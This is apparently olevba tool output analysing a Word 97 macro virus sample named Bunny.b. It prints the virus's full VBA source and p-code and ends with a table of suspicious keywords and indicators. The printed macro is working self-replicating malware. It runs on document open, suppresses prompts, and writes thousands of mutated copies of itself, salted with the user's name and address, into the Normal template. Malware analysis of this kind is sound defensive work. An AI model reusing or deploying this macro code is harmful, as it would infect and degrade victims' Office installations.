olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bunny.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bunny.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BunniesB.bas 
in file: Virus.MSWord.Bunny.b - OLE stream: 'Macros/VBA/BunniesB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public SCode As String
Public stuff As String
' W97T/Bunnies .b
' Word Trojan Bunnies .b variant by Error
Sub AutoOpen()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Options.SaveNormalPrompt = False
SCode = Dir("C:\windows\system\b.cpl")
If SCode = "b.cpl" Then Call Spread Else
ActiveDocument.VBProject.VBComponents("BunniesB").Export ("C:\Windows\System\b.cpl")
Call Spread
End Sub
Function Spread()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
' Begin to do what bunnies do...Now with exponential growth!!
For X = 1 To 10000 Step 1
Open "C:\windows\system\b.cpl" For Input As #3
Open "C:\Windows\system\bunnies.cpl" For Append As #4
Randomize Timer
Do
Line Input #3, stuff
Print #4, stuff
    Randomize Timer
    t = Int(Rnd(1) * 5) + 1
        If t = 1 Then Z$ = " '" & Application.UserAddress
        If t = 2 Then Z$ = " '" & Application.UserName
        If t = 3 Then Z$ = " '" & Time$
        If t = 4 Then Z$ = " '" & Application.UserInitials
        If t = 5 Then Z$ = " '" & Int(Rnd(1) * 9999999)
Print #4, Z$
        Loop Until stuff = "' EOF"
Close #3
Close #4
' Code Morpher from RAPE v2.0 (Random Arithmatic Polymorphic Engine) by Error
Kill "C:\Windows\System\b.cpl"
Dim OldName
Dim NewName
OldName = "C:\Windows\System\bunnies.cpl": NewName = "C:\Windows\System\b.cpl"
Name OldName As NewName
    With NormalTemplate.VBProject.VBComponents.Import("C:\Windows\System\b.cpl")
    End With
Next X
NormalTemplate.Save
MsgBox "Bunnies!!!!", 48
Kill "C:\Windows\System\Bunnies.cpl"
Kill "C:\Windows\System\B.cpl"
End Function
' EOF
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bunny.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/BunniesB - 3751 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn SCode (As String)
' Line #1:
' 	Dim (Public) 
' 	VarDefn stuff (As String)
' Line #2:
' 	QuoteRem 0x0000 0x0010 " W97T/Bunnies .b"
' Line #3:
' 	QuoteRem 0x0000 0x0028 " Word Trojan Bunnies .b variant by Error"
' Line #4:
' 	FuncDefn (Sub AutoOpen())
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0017 "C:\windows\system\b.cpl"
' 	ArgsLd Dir 0x0001 
' 	St SCode 
' Line #9:
' 	Ld SCode 
' 	LitStr 0x0005 "b.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Spread 0x0000 
' 	Else 
' 	BoSImplicit 
' 	EndIf 
' Line #10:
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	Paren 
' 	LitStr 0x0008 "BunniesB"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #11:
' 	ArgsCall (Call) Spread 0x0000 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Function Spread())
' Line #14:
' 	OnError (Resume Next) 
' Line #15:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #16:
' 	QuoteRem 0x0000 0x003C " Begin to do what bunnies do...Now with exponential growth!!"
' Line #17:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x0001 
' 	ForStep 
' Line #18:
' 	LitStr 0x0017 "C:\windows\system\b.cpl"
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #19:
' 	LitStr 0x001D "C:\Windows\system\bunnies.cpl"
' 	LitDI2 0x0004 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #20:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #21:
' 	Do 
' Line #22:
' 	LitDI2 0x0003 
' 	Ld stuff 
' 	LineInput 
' Line #23:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld stuff 
' 	PrintItemNL 
' Line #24:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #25:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #26:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #27:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #28:
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Time$ 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #29:
' 	Ld t 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #30:
' 	Ld t 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x967F 0x0098 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #31:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld Z$ 
' 	PrintItemNL 
' Line #32:
' 	Ld stuff 
' 	LitStr 0x0005 "' EOF"
' 	Eq 
' 	LoopUntil 
' Line #33:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #34:
' 	LitDI2 0x0004 
' 	Sharp 
' 	Close 0x0001 
' Line #35:
' 	QuoteRem 0x0000 0x004C " Code Morpher from RAPE v2.0 (Random Arithmatic Polymorphic Engine) by Error"
' Line #36:
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	ArgsCall Kill 0x0001 
' Line #37:
' 	Dim 
' 	VarDefn OldName
' Line #38:
' 	Dim 
' 	VarDefn NewName
' Line #39:
' 	LitStr 0x001D "C:\Windows\System\bunnies.cpl"
' 	St OldName 
' 	BoS 0x0000 
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	St NewName 
' Line #40:
' 	Ld OldName 
' 	Ld NewName 
' 	Name 
' Line #41:
' 	StartWithExpr 
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #42:
' 	EndWith 
' Line #43:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #45:
' 	LitStr 0x000B "Bunnies!!!!"
' 	LitDI2 0x0030 
' 	ArgsCall MsgBox 0x0002 
' Line #46:
' 	LitStr 0x001D "C:\Windows\System\Bunnies.cpl"
' 	ArgsCall Kill 0x0001 
' Line #47:
' 	LitStr 0x0017 "C:\Windows\System\B.cpl"
' 	ArgsCall Kill 0x0001 
' Line #48:
' 	EndFunc 
' Line #49:
' 	QuoteRem 0x0000 0x0004 " EOF"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |b.cpl               |Executable file name                         |
|IOC       |bunnies.cpl         |Executable file name                         |
|IOC       |Bunnies.cpl         |Executable file name                         |
|IOC       |B.cpl               |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

